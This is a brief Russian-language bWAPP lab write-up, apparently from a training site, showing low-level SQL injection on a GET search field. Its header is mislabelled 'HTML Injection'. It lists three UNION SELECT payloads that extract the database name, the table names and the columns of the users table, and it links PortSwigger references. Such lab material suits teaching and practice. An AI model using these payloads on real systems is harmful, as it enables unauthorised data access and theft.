---
layout: default
title: HTML Injection (Low)
parent: A1 - Injection  # Ссылка на title из Шага 2
grand_parent: bWAPP Labs # Ссылка на title из Шага 1
---
**SQL Injection (GET/Search)** - **(low)**

Используем строку

asd\' UNION SELECT NULL,database(),NULL,NULL,NULL,NULL,NULL\-- -

чтобы вывести название базы

теперь используем строку

asd\' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL from
information_schema.tables where table_schema=database()\-- -

чтобы узнать, какие в базе есть такблицы

на интересует users, поэтому используем следующую строку

asd\' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL from
information_schema.columns where table_name=\'users\'\-- -

чтобы получить список пользователей

в таком темпе можно продолжать пока не получим интересующую информацию

![Рисунок 1](./images/media/image1.png)

подробнее ознакомиться с этой темой советую тут: https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli

шпаргалка по SQL тут: https://portswigger.net/web-security/sql-injection/cheat-sheet